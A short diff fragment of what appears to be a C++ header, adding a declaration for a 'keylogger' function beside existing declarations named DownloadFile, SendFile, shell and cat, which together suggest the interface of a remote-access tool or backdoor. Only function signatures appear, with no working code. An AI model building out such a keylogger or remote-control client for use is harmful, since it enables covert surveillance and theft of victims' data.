@@ -29,3 +29,4 @@ void DownloadFile(std::string link);
 void SendFile(std::string path);
 void shell(std::string);
 void cat(std::string path);
+void keylogger(std::string command);
